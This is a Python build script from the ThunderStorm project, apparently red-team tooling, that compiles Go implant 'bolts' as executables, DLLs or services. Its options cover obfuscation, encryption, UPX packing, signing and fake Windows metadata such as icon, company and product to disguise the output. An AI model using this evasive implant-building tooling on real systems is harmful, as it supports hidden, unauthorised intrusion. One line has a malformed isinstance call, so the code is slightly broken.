#!/usr/bin/python3


from glob import glob
from json import loads
from subprocess import run
from include.util import nes
from tempfile import mkdtemp
from include.files import Bolt
from os import environ, remove
from secrets import token_bytes
from shutil import rmtree, copy
from traceback import format_exc
from sys import argv, exit, stderr
from include.crypt import strip_binary
from include.config import Config, Utils
from argparse import ArgumentParser, BooleanOptionalAction
from os.path import join, isdir, expanduser, expandvars, exists
from include.builder import OS, ARCH, tiny_root, build_cgo, build_go, upx, sign, Options

_LINKERS = [
    "t",
    "p",
    "e",
    "m",
    "n",
    "s",
    "tcp",
    "pipe",
    "event",
    "mutex",
    "mailslot",
    "semaphore",
]
_FORMATS = [
    "bolt",
    "bolt/dll",
    "bolt/dllsvc",
    "dll",
    "dll/svc",
    "launcher",
    "launcher/dll",
    "launcher/dllsvc",
]

HELP_TEXT = """ JetStream: ThunderStorm Bolt Builder
Part of the |||||| ThunderStorm Project (https://dij.sh/ts)
(c) 2019 - 2022 iDigitalFlame

{binary} -t <target> -p <profile> -o <output> [other arguments]

Required Arguments:
  -t             <os>/<arch>
  --target
  -p             <profile_file>
  --profile
  -o             <file>
  --output

Optional Arguments:
  -c             <config_file>
  --config
  -f             <binary_format>
  --format

Configuration Arguments (Can be saved with the '-c' argument):
  -P             <pipe_name>
  --pipe
  -T             <tag1,tagN..>
  --tags
  -G             <guardian_name>
  --guard
  -g             <GOROOT>
  --goroot
  -L             <guardian_linker>
  --linker
  -Z
  --tiny
  --no-tiny
  -K
  --crypt
  --no-crypt
  -O
  --garble
  --no-garble
  -W
  --load
  --no-load
  -I
  --ignore
  --no-ignore
  -C
  --critical
  --no-critical

Build Arguments (All are optional):
  Generic Build Arguments
   -k            <checks>
   --checks
   -u
   --upx
   -S
   --strip
   --no-strip
   -s            <pfx_file>
   --pfx
   -w            <password>
   --pw

  Windows Specific Build Arguments:
   -r
   --resource

   Binary Resources Arguments:
    -i           <ico_file>
    --icon
    -Rn          <filename>
    --name
    -Rt          <title>
    --title
    -Rc          <company>
    --company
    -Rp          <product>
    --product
    -Rv          <version>
    --version
    -Rx          <copyright>
    --copyright

   DLL Specific Arguments:
    --svc        <service_name>
    --func       <function_name>
    --thread     <thread_name>
    --timeout    <service_loop(h|m|s)>
"""


class JetStream(object):
    def __init__(self, file=None):
        self.opts = Options(file)

    def close(self):
        try:
            rmtree(self.dir, ignore_errors=True)
        except AttributeError:
            pass

    def log(self, msg):
        print(f"[+]: {msg}")

    def get(self, b, n):
        return self.opts.get(b, n)

    def build(self, cfg, func, target, **kw):
        if not isinstance(cfg, Config) or len(cfg) == 0:
            raise ValueError("build: invalid/empty Config")
        if not callable(func):
            raise ValueError("build: invalid generate function")
        if not nes(target) or "/" not in target:
            raise ValueError("build: invalid target")
        n = target.find("/")
        if n is None or n < 3:
            raise ValueError("build: invalid target")
        osv = target[:n].lower().strip()
        if osv not in OS:
            raise ValueError("build: invalid target (os)")
        arch = target[n + 1 :].lower().strip()
        del n
        if arch not in ARCH:
            raise ValueError("build: invalid target (arch)")
        if osv not in ARCH[arch]:
            raise ValueError("build: invalid target (arch/os)")
        key = self.get("config", "key")
        if isinstance(key, (bytes, bytearray) and len(key) > 0:
            key = key.encode("UTF-8")
        elif not nes(key):
            key = token_bytes(64)
        try:
            go = func(builder=self, key=key, cfg=cfg, os=osv, arch=arch, **kw)
        except TypeError as err:
            raise ValueError(f"build: generate function is invalid ({err})")
        del key
        env = environ.copy()
        env["GOOS"] = osv
        env["GOARCH"] = arch
        r = self.get("build", "root")
        if "GOROOT" not in env and not nes(r):
            raise ValueError("build: GOROOT is not set in env and not set in build")
        if nes(r):
            r = expandvars(expanduser(r))
            if not isdir(r):
                raise ValueError('build: build "root" does not exist')
            env["GOROOT"] = r
        self.dir = mkdtemp(suffix="-jetstream")
        if self.get("build", "tiny"):
            nr = join(self.dir, "root")
            if not isdir(nr):
                self.log("Building tiny GOROOT..")
                env["GOROOT"] = tiny_root(env["GOROOT"], nr)
            del nr
        self.log(f'GOOS="{osv}", GOARCH="{arch}", GOROOT="{env["GOROOT"]}"..')
        if osv == "windows":
            r = kw.get("res")
            if r is not None and not isinstance(r, dict):
                raise ValueError('build: "res" argument must be a dict')
            if len(r) == 0:
                r = None
            b = build_cgo(
                self,
                env,
                go,
                arch == "amd64",
                r,
                **kw,
            )
            del r
            if kw.get("strip", True):
                self.log("Sanitizing and stripping binary..")
                strip_binary(b)
            if kw.get("upx", False):
                upx(self, b)
            p = kw.get("pw")
            k = kw.get("pfx")
            if nes(p) and nes(k):
                sign(self, expandvars(expanduser(p)), k, b)
            del p
            del k
        else:
            b = build_go(self, env, go, osv, arch)
            if kw.get("strip", True):
                self.log("Sanitizing and stripping binary..")
                strip_binary(b)
            if kw.get("upx", False):
                upx(self, b)
            p = kw.get("pw")
            k = kw.get("pfx")
            if nes(p) and nes(k):
                sign(self, expandvars(expanduser(p)), k, b)
            del p
            del k
        del env
        del osv
        del arch
        for v in glob(self.dir + "/*", recursive=False):
            if v == b or v.endswith("root") or isdir(v):
                continue
            remove(v)
        return b

    def run(self, cmd, env=None, wd=None, out=True, trunc=False):
        if trunc:
            x = " ".join(cmd)
            if len(x) > 200:
                x = x[:200] + " [trunc]"
            self.log(f'Running "{x}"..')
            del x
        else:
            self.log(f'Running "{" ".join(cmd)}"..')
        e = environ
        if env is not None:
            e = env
        try:
            run(
                cmd,
                env=e,
                cwd=wd,
                text=True,
                check=True,
                shell=False,
                capture_output=out,
            )
        finally:
            del e


class _JetStreamParser(ArgumentParser):
    def __init__(self):
        ArgumentParser.__init__(self)
        self.add_argument("-w", "--pw", dest="pw", type=str)
        self.add_argument("-s", "--pfx", dest="pfx", type=str)
        self.add_argument("-k", "--checks", dest="checks", type=str)
        self.add_argument("-f", "--format", dest="format", type=str)
        self.add_argument("-c", "--config", dest="config", type=str)
        self.add_argument("-u", "--upx", dest="upx", action="store_true")
        self.add_argument("-t", "--target", dest="target", required=True, type=str)
        self.add_argument("-o", "--output", dest="output", required=True, type=str)
        self.add_argument("-p", "--profile", dest="profile", required=True, type=str)
        self.add_argument(
            "-S", "--strip", dest="strip", default=True, action=BooleanOptionalAction
        )

        self.add_argument("-r", "--resource", dest="resource", type=str)
        self.add_argument("-i", "--icon", dest="res_icon", type=str)
        self.add_argument("-Rn", "--name", dest="res_file", type=str)
        self.add_argument("-Rt", "--title", dest="res_title", type=str)
        self.add_argument("-Rc", "--company", dest="res_company", type=str)
        self.add_argument("-Rp", "--product", dest="res_product", type=str)
        self.add_argument("-Rv", "--version", dest="res_version", type=str)
        self.add_argument("-Rx", "--copyright", dest="res_copyright", type=str)

        self.add_argument("--svc", dest="dll_svc", type=str)
        self.add_argument("--func", dest="dll_func", type=str)
        self.add_argument("--thread", dest="dll_thread", type=str)
        self.add_argument("--timeout", dest="dll_timeout", type=str)

        self.add_argument("-P", "--pipe", dest="pipe", type=str)
        self.add_argument("-T", "--tags", dest="tags", type=str)
        self.add_argument("-G", "--guard", dest="guard", type=str)
        self.add_argument("-g", "--goroot", dest="root", type=str)
        self.add_argument("-L", "--linker", dest="linker", type=str)

        self.add_argument("-Z", "--tiny", dest="tiny", action=BooleanOptionalAction)
        self.add_argument("-K", "--crypt", dest="crypt", action=BooleanOptionalAction)
        self.add_argument("-O", "--garble", dest="garble", action=BooleanOptionalAction)

        self.add_argument("-W", "--load", dest="load", action=BooleanOptionalAction)
        self.add_argument("-I", "--ignore", dest="ignore", action=BooleanOptionalAction)
        self.add_argument(
            "-C", "--critical", dest="critical", action=BooleanOptionalAction
        )

    def cli(self):
        r = self.parse_args()
        if not nes(r.target):
            return print("target argument is required")
        if not nes(r.output):
            return print("output argument is required")
        if not nes(r.profile):
            return print("profile argument is required")
        if nes(r.pfx):
            if not nes(r.pw):
                return print('pfx argument requires the "-w" or "--pw" argument')
            if not exists(expandvars(expanduser(r.pfx))):
                return print(f'pfx file "{r.pfx}" does not exist')
        if not nes(r.format):
            r.format = "bolt"
        else:
            if r.format.lower() not in _FORMATS:
                return print(
                    f'format "{r.format} is invalid (valid formats {", ".join(_FORMATS)})'
                )
            if "svc" in r.format and not nes(r.dll_svc):
                return print(
                    'dll service requires a service name specified with "--svc"'
                )
        rc = dict()
        if nes(r.resource):
            with open(expandvars(expanduser(r.resource))) as f:
                rc = loads(f.read())
            if not isinstance(rc, dict):
                return print(f'resource file "{r.resource}" is not valid')
        if nes(r.res_icon):
            rc["icon"] = r.res_icon
        if nes(r.res_file):
            rc["file"] = r.res_file
        if nes(r.res_title):
            rc["title"] = r.res_title
        if nes(r.res_company):
            rc["company"] = r.res_company
        if nes(r.res_product):
            rc["product"] = r.res_product
        if nes(r.res_version):
            rc["version"] = r.res_version
        if nes(r.res_copyright):
            rc["copyright"] = r.res_copyright
        j, v = JetStream(), None
        if nes(r.config):
            v = expandvars(expanduser(r.config))
            if exists(v):
                j.opts.load(r.config)
        if nes(r.pipe):
            j.opts.set("config", "pipe", r.pipe)
        if nes(r.guard):
            j.opts.set("config", "guard", r.guard)
        if nes(r.linker):
            j.opts.set("config", "linker", r.linker)
        if nes(r.root):
            j.opts.set("build", "root", r.root)
        if nes(r.tags):
            j.opts.set("build", "tags", [t.strip() for t in r.tags.split(",")])
        if r.tiny is not None:
            j.opts.set("build", "tiny", r.tiny)
        if r.crypt is not None:
            j.opts.set("build", "crypt", r.crypt)
        if r.garble is not None:
            j.opts.set("build", "garble", r.garble)
        if r.load is not None:
            j.opts.set("config", "load", r.load)
        if r.ignore is not None:
            j.opts.set("config", "ignore", r.ignore)
        if r.critical is not None:
            j.opts.set("config", "critical", r.critical)
        k = j.opts.get("config", "linker")
        if nes(k) and k.lower() not in _LINKERS:
            return print(
                f'linker "{r.format} is invalid (valid linkers {", ".join(_FORMATS)})'
            )
        del k
        t = None
        if nes(r.dll_timeout):
            t = Utils.str_to_dur(r.dll_timeout) / 1000000
        kw = {
            "pw": r.pw,
            "dll": "dll" in r.format,
            "pfx": r.pfx,
            "res": rc,
            "upx": r.upx,
            "strip": r.strip,
            "checks": r.checks,
            "dll_svc": r.dll_svc,
            "dll_func": r.dll_func,
            "dll_thread": r.dll_thread,
            "dll_timeout": t,
        }
        del t
        del rc
        c = Config.from_file(expanduser(expandvars(r.profile)))
        f = Bolt
        if not r.format.startswith("bolt") and not r.format.startswith("dll"):
            raise RuntimeError("working on other formats")
        try:
            j.opts.validate()
            o = j.build(c, f, r.target, **kw)
        except Exception as err:
            raise err
        else:
            copy(o, r.output)
            j.opts.save(v)
            del o
        finally:
            del c
            del f
            del v
            del kw
            j.close()
            del j
            del r

    def parse_args(self):
        if len(argv) <= 1:
            return self.print_help()
        return super(__class__, self).parse_args()

    def print_help(self, file=None):
        print(HELP_TEXT.format(binary=argv[0]), file=file)
        exit(2)


if __name__ == "__main__":
    j = _JetStreamParser()
    try:
        j.cli()
    except Exception as err:
        print(f"Error: {err}\n{format_exc(limit=10)}", file=stderr)
        exit(1)
